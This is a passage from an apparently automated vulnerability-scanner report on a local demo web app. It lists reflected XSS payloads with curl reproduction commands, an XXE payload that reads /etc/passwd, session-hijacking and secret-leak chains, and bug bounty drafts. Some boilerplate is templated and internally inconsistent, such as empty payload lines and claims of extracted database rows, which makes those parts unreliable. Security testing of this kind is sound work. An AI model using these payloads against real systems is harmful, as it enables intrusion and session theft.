#### Proof of exploitation

The scanner confirmed that executable JavaScript payloads (<script>alert('bhxssrc1')</script>, <img src=x onerror=alert('bhxssrc1')>, <svg onload=alert('bhxssrc1')>, <body onload=alert('bhxssrc1')>) are reflected into the response with no encoding or filtering -- a browser will execute them in the victim's session. This upgrades the finding from 'reflected markup' to a working cross-site scripting exploit.

**Data extracted from the target by the exploit:**

```
Executable payload shapes that survive filtering: 4 of 4
Surviving: <script>alert('bhxssrc1')</script>
Surviving: <img src=x onerror=alert('bhxssrc1')>
Surviving: <svg onload=alert('bhxssrc1')>
Surviving: <body onload=alert('bhxssrc1')>
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'q=<script>alert('\''bhxssrc1'\'')</script>' 'http://127.0.0.1:8081/search'
```

**Raw HTTP exchange:**

```http
GET /search?q=%3Cscript%3Ealert%28%27bhxssrc1%27%29%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 73
content-type: text/html; charset=utf-8

<html><body>Results for: <script>alert('bhxssrc1')</script></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/search in a browser.
2. Set the query parameter 'q' to: <script>alert('bhxssrc1')</script>
3. Load the resulting URL (send it to a victim in a real attack).
4. Observe the JavaScript alert('bhxssrc1') dialog executing in the page origin.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Context-aware output encoding; apply CSP; validate input.

#### Bounty submission draft

**Title:** Reflected XSS in 'q'

**Severity:** high (CWE-79)

**Asset:** http://127.0.0.1:8081/search

**Summary:** Input from 'q' is reflected without HTML-encoding, allowing script injection.

**Impact:** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 20. [HIGH] Reflected XSS in 'name'

- **Class:** Cross-Site Scripting (XSS)
- **URL:** http://127.0.0.1:8081/file
- **Injection point:** `GET /file -> request parameter 'name'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-79
- **Module:** xss

**Description.** Input from 'name' is reflected without HTML-encoding, allowing script injection.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
<!-- Reconstructed from behaviour: input is echoed into the HTML body
     without contextual encoding, so injected markup/script executes. -->
<p>Results for: <?= request_input ?></p>   <!-- unencoded reflection -->
```

**Impact.** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Detection evidence.**

```
Payload '<bhXSS9271>"\'' reflected as raw HTML (<bhXSS9271> present).

GET http://127.0.0.1:8081/file (name=<bhXSS9271>"')

--- response excerpt ---
contents of <bhXSS9271>"'
```

#### Proof of exploitation

The scanner confirmed that executable JavaScript payloads (<script>alert('bhxssrc1')</script>, <img src=x onerror=alert('bhxssrc1')>, <svg onload=alert('bhxssrc1')>, <body onload=alert('bhxssrc1')>) are reflected into the response with no encoding or filtering -- a browser will execute them in the victim's session. This upgrades the finding from 'reflected markup' to a working cross-site scripting exploit.

**Data extracted from the target by the exploit:**

```
Executable payload shapes that survive filtering: 4 of 4
Surviving: <script>alert('bhxssrc1')</script>
Surviving: <img src=x onerror=alert('bhxssrc1')>
Surviving: <svg onload=alert('bhxssrc1')>
Surviving: <body onload=alert('bhxssrc1')>
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'name=<script>alert('\''bhxssrc1'\'')</script>' 'http://127.0.0.1:8081/file'
```

**Raw HTTP exchange:**

```http
GET /file?name=%3Cscript%3Ealert%28%27bhxssrc1%27%29%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 46
content-type: text/html; charset=utf-8

contents of <script>alert('bhxssrc1')</script>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/file in a browser.
2. Set the query parameter 'name' to: <script>alert('bhxssrc1')</script>
3. Load the resulting URL (send it to a victim in a real attack).
4. Observe the JavaScript alert('bhxssrc1') dialog executing in the page origin.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Context-aware output encoding; apply CSP; validate input.

#### Bounty submission draft

**Title:** Reflected XSS in 'name'

**Severity:** high (CWE-79)

**Asset:** http://127.0.0.1:8081/file

**Summary:** Input from 'name' is reflected without HTML-encoding, allowing script injection.

**Impact:** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 21. [HIGH] Reflected XSS in 'theme'

- **Class:** Cross-Site Scripting (XSS)
- **URL:** http://127.0.0.1:8081/merge
- **Injection point:** `GET /merge -> request parameter 'theme'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-79
- **Module:** xss

**Description.** Input from 'theme' is reflected without HTML-encoding, allowing script injection.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
<!-- Reconstructed from behaviour: input is echoed into the HTML body
     without contextual encoding, so injected markup/script executes. -->
<p>Results for: <?= request_input ?></p>   <!-- unencoded reflection -->
```

**Impact.** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Detection evidence.**

```
Payload '<bhXSS9271>"\'' reflected as raw HTML (<bhXSS9271> present).

GET http://127.0.0.1:8081/merge (theme=<bhXSS9271>"')

--- response excerpt ---
<html><body><script>var config = Object.assign({}, {"theme": "<bhXSS9271>\"'"});</script></body></html>
```

#### Proof of exploitation

The scanner confirmed that executable JavaScript payloads (<img src=x onerror=alert('bhxssrc1')>, <svg onload=alert('bhxssrc1')>, <body onload=alert('bhxssrc1')>) are reflected into the response with no encoding or filtering -- a browser will execute them in the victim's session. This upgrades the finding from 'reflected markup' to a working cross-site scripting exploit.

**Data extracted from the target by the exploit:**

```
Executable payload shapes that survive filtering: 3 of 4
Surviving: <img src=x onerror=alert('bhxssrc1')>
Surviving: <svg onload=alert('bhxssrc1')>
Surviving: <body onload=alert('bhxssrc1')>
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'theme=<img src=x onerror=alert('\''bhxssrc1'\'')>' 'http://127.0.0.1:8081/merge'
```

**Raw HTTP exchange:**

```http
GET /merge?theme=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27bhxssrc1%27%29%3E HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Mon, 12 Oct 2026 12:41:31 GMT
server: uvicorn
content-length: 126
content-type: text/html; charset=utf-8

<html><body><script>var config = Object.assign({}, {"theme": "<img src=x onerror=alert('bhxssrc1')>"});</script></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/merge in a browser.
2. Set the query parameter 'theme' to: <img src=x onerror=alert('bhxssrc1')>
3. Load the resulting URL (send it to a victim in a real attack).
4. Observe the JavaScript alert('bhxssrc1') dialog executing in the page origin.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Context-aware output encoding; apply CSP; validate input.

#### Bounty submission draft

**Title:** Reflected XSS in 'theme'

**Severity:** high (CWE-79)

**Asset:** http://127.0.0.1:8081/merge

**Summary:** Input from 'theme' is reflected without HTML-encoding, allowing script injection.

**Impact:** Attackers execute arbitrary JavaScript in your users' browsers under your origin: session-cookie theft (no HttpOnly required for DOM attacks), keylogging, phishing overlays, silent request forgery with the victim's credentials, and wormable payloads in social features. Every user who opens an attacker-crafted link is affected.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 22. [HIGH] XML External Entity (file disclosure) on http://127.0.0.1:8081/import-xml

- **Class:** XML External Entity (XXE)
- **URL:** http://127.0.0.1:8081/import-xml
- **Injection point:** `POST /import-xml`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-611
- **Module:** xxe-prober

**Description.** The XML parser at this endpoint resolves external entities. Internal files (/etc/passwd) were read and reflected into the response.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
XML entity referencing file:///etc/passwd returned passwd-shaped lines:
<r>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/sp

POST http://127.0.0.1:8081/import-xml (application/xml) body:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>

--- response excerpt ---
<r>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/va
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -X POST --data 'xml=%3Cr%2F%3E' 'http://127.0.0.1:8081/import-xml'
```

**Raw HTTP exchange:**

```http
POST /import-xml HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

xml=%3Cr%2F%3E
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/import-xml in a browser or HTTP client.
2. Send the request again with the body parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Disable DTDs/external entities (libxml: XML_PARSE_NOENT off, defuse_xml_entities, javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING); prefer JSON.

#### Bounty submission draft

**Title:** XML External Entity (file disclosure) on http://127.0.0.1:8081/import-xml

**Severity:** high (CWE-611)

**Asset:** http://127.0.0.1:8081/import-xml

**Summary:** The XML parser at this endpoint resolves external entities. Internal files (/etc/passwd) were read and reflected into the response.

**Impact:** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 23. [HIGH] Reflected XSS in 'url'

- **Class:** Cross-Site Scripting (XSS)
- **URL:** http://127.0.0.1:8081/fetch
- **Injection point:** `GET /fetch -> request parameter 'url'`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-79
- **Module:** xss

**Description.** Input from 'url' is reflected without HTML-encoding, allowing script injection.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
<!-- Reconstructed from behaviour: input is echoed into the HTML body
     without contextual encoding, so injected markup/script executes. -->
<p>Results for: <?= request_input ?></p>   <!-- unencoded reflection -->
```

**Detection evidence.**

```
Payload '<bhXSS9271>"\'' reflected as raw HTML (<bhXSS9271> present).

GET http://127.0.0.1:8081/fetch (url=<bhXSS9271>"')

--- response excerpt ---
fetch failed: unknown url type: '<bhXSS9271>"\''
```

#### Exploit phase result

Input is reflected unencoded, but the reflection lands in a non-HTML response (Content-Type: text/plain; charset=utf-8), which browsers do not render as markup; not exploitable as stored XSS from this response alone.

#### False-positive analysis

1 of 3 false-positive checks FAILED (fresh-canary-execution-context). Treat this finding as unconfirmed until a human reviews the captured evidence; it may be an artefact of page drift, caching or error pages.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| fresh-canary-execution-context | FAIL | unique canary xssxd1bi98415 reflected with executable handler markup in a non-HTML response |
| not-inside-html-comment | PASS | reflection is outside HTML comments (browsers do not execute payloads inside comments) |
| negative-control | PASS | bare canary reflected as inert text (confirmed), confirming the server renders raw input only when markup is supplied |

**Verdict: MEDIUM false-positive risk** -- at least one control experiment contradicts the finding. Manual review required before triage.

**Remediation.** Context-aware output encoding; apply CSP; validate input.

### 24. [HIGH] Chained: reflected XSS + session cookie without HttpOnly -> session hijacking

- **Class:** Session Fixation / Hijacking
- **URL:** http://127.0.0.1:8081/search
- **Injection point:** `GET /search`
- **Status:** confidence: firm (exploit attempted)
- **Module:** exploit-chainer
- **Attack chain:** `xss-to-session-theft` -- composed from 1 finding(s)

**Chain narrative.** Reflected XSS in 'q' -> Chained: reflected XSS + session cookie without HttpOnly -> session hijacking

**Description.** The verified reflected-XSS sink executes attacker-controlled JavaScript in a victim's browser, and the application's session cookie(s) (SESSIONID, jwt_session) are readable from JavaScript because they lack the HttpOnly attribute. An attacker only needs the XSS to run once to copy the session cookie and take over the victim session -- no credential access required.

**Impact.** One scripted link (phishing message, stored comment, injected ad) silently hands the attacker a live session. The victim sees nothing; the attacker replays the cookie and operates as the victim until the session expires.

**Detection evidence.**

```
1) XSS: The scanner confirmed that executable JavaScript payloads (<script>alert('bhxssrc1')</script>, <img src=x onerror=alert('bhxssrc1')>, <svg onload=alert('bhxssrc1')>, <body onload=alert('bhxssrc1')>) are reflected into the response with no encoding or filtering -- a browser will execute them in the victim's session. This upgrades the finding from 'reflected markup' to a working cross-site scripting exploit.
2) session cookies visible to JavaScript: SESSIONID, jwt_session (no HttpOnly flag observed on the Set-Cookie headers captured this session)
```

#### Exploit phase result

Attack chain assembled from independently verified findings: Reflected XSS in 'q'. Every link's raw evidence appears in its parent finding's report section; this finding carries the combined impact.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Set HttpOnly (and Secure) on every session cookie; add a Content-Security-Policy that blocks inline script; fix the XSS sink.

#### Bounty submission draft

**Title:** Chained: reflected XSS + session cookie without HttpOnly -> session hijacking

**Severity:** high

**Asset:** http://127.0.0.1:8081/search

**Summary:** The verified reflected-XSS sink executes attacker-controlled JavaScript in a victim's browser, and the application's session cookie(s) (SESSIONID, jwt_session) are readable from JavaScript because they lack the HttpOnly attribute. An attacker only needs the XSS to run once to copy the session cookie and take over the victim session -- no credential access required.

**Impact:** One scripted link (phishing message, stored comment, injected ad) silently hands the attacker a live session. The victim sees nothing; the attacker replays the cookie and operates as the victim until the session expires.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 25. [HIGH] Chained: source/backup exposure discloses application secrets

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** confidence: firm (exploit attempted)
- **Module:** exploit-chainer
- **Attack chain:** `source-exposure-to-secrets` -- composed from 2 finding(s)

**Chain narrative.** Exposed source map: http://127.0.0.1:8081/static/app.js.map -> Possible hardcoded secret: Stripe secret key -> Chained: source/backup exposure discloses application secrets

**Description.** Un-minified application source or backup files are reachable, and the same surface leaks credential-shaped strings (API keys, passwords, tokens). An attacker downloads the exposed file and walks away with working secrets -- no injection needed.

**Impact.** Leaked source often contains third-party API keys, mail credentials, cloud tokens and internal endpoints. These are immediately reusable against the organization's other systems.

**Detection evidence.**

```
1) exposure: Exposed source map: http://127.0.0.1:8081/static/app.js.map -- sourcesCount=2; sample sources: ../src/app.js, ../src/internal.js
2) secrets in that surface: Possible hardcoded secret: Stripe secret key -- Stripe secret key match: 'sk_live_0123456789abcdefghijklmn'
```

#### Exploit phase result

Attack chain assembled from independently verified findings: Exposed source map: http://127.0.0.1:8081/static/app.js.map -> Possible hardcoded secret: Stripe secret key. Every link's raw evidence appears in its parent finding's report section; this finding carries the combined impact.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove source maps/backups from production; rotate the exposed secrets; add secret-scanning to CI so keys never ship in bundles.

#### Bounty submission draft

**Title:** Chained: source/backup exposure discloses application secrets

**Severity:** high

**Asset:** http://127.0.0.1:8081/

**Summary:** Un-minified application source or backup files are reachable, and the same surface leaks credential-shaped strings (API keys, passwords, tokens). An attacker downloads the exposed file and walks away with working secrets -- no injection needed.

**Impact:** Leaked source often contains third-party API keys, mail credentials, cloud tokens and internal endpoints. These are immediately reusable against the organization's other systems.

**Steps to reproduce:** see the reproduction steps / curl one-liner above (all evidence in this report is captured verbatim and re-runnable).


### 26. [MEDIUM] Exposed management path: admin panel (200)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/admin
- **Injection point:** `GET /admin`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** admin-panels

**Description.** A common management / admin path (/admin) returned HTTP 200, indicating it exists. Investigate authentication, default credentials, and known CVEs for the corresponding product.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/admin -> 200; body[:120]="<html><body><h1>Admin Panel</h1><form><input name='password'/></form></body></html>"
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'password=test' 'http://127.0.0.1:8081/admin'
```

**Raw HTTP exchange:**

```http
GET /admin?password=test HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/admin in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the management interface from public exposure; gate behind VPN / strong auth.

### 27. [MEDIUM] Exposed management path: GraphQL endpoint (200)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/graphql
- **Injection point:** `GET /graphql`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** admin-panels

**Description.** A common management / admin path (/graphql) returned HTTP 200, indicating it exists. Investigate authentication, default credentials, and known CVEs for the corresponding product.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/graphql -> 200; body[:120]='{"errors": [{"message": "not supported in demo"}]}'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the management interface from public exposure; gate behind VPN / strong auth.

### 28. [MEDIUM] Exposed management path: ReDoc (200)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/redoc
- **Injection point:** `GET /redoc`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** admin-panels

**Description.** A common management / admin path (/redoc) returned HTTP 200, indicating it exists. Investigate authentication, default credentials, and known CVEs for the corresponding product.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/redoc -> 200; body[:120]='\n    <!DOCTYPE html>\n    <html>\n    <head>\n    <title>FastAPI - ReDoc</title>\n    <!-- needed for adaptive design -->\n  '
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the management interface from public exposure; gate behind VPN / strong auth.

### 29. [MEDIUM] Exposed management path: status (200)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/status
- **Injection point:** `GET /status`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** admin-panels

**Description.** A common management / admin path (/status) returned HTTP 200, indicating it exists. Investigate authentication, default credentials, and known CVEs for the corresponding product.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/status -> 200; body[:120]='status ok'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the management interface from public exposure; gate behind VPN / strong auth.

### 30. [MEDIUM] Exposed API documentation: OpenAPI JSON

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/openapi.json
- **Injection point:** `GET /openapi.json`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** api-discovery

**Description.** An API description endpoint is publicly accessible. It exposes the entire API surface (endpoints, parameters, schemas, and often internal/undocumented routes) -- a treasure map for the active phase.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/openapi.json -> 200; content-type=application/json; body[:200]='{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/":{"get":{"summary":"Index","operationId":"index__get","responses":{"200":{"description":"Successful Response","content":{"te'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Restrict API doc endpoints to authenticated / internal users.

### 31. [MEDIUM] Exposed API documentation: ReDoc

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/redoc
- **Injection point:** `GET /redoc`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** api-discovery

**Description.** An API description endpoint is publicly accessible. It exposes the entire API surface (endpoints, parameters, schemas, and often internal/undocumented routes) -- a treasure map for the active phase.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/redoc -> 200; content-type=text/html; charset=utf-8; body[:200]='\n    <!DOCTYPE html>\n    <html>\n    <head>\n    <title>FastAPI - ReDoc</title>\n    <!-- needed for adaptive design -->\n    <meta charset="utf-8"/>\n    <meta name="viewport" content="width=device-width,'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Restrict API doc endpoints to authenticated / internal users.

### 32. [MEDIUM] Cookie 'SESSIONID' missing security flags

- **Class:** Session Fixation / Hijacking
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-614
- **Module:** cookies

**Description.** Cookie 'SESSIONID' is set without: missing Secure, missing HttpOnly, missing SameSite. This weakens protection against theft (XSS) and CSRF.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Set-Cookie: SESSIONID=...; missing Secure; missing HttpOnly; missing SameSite
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

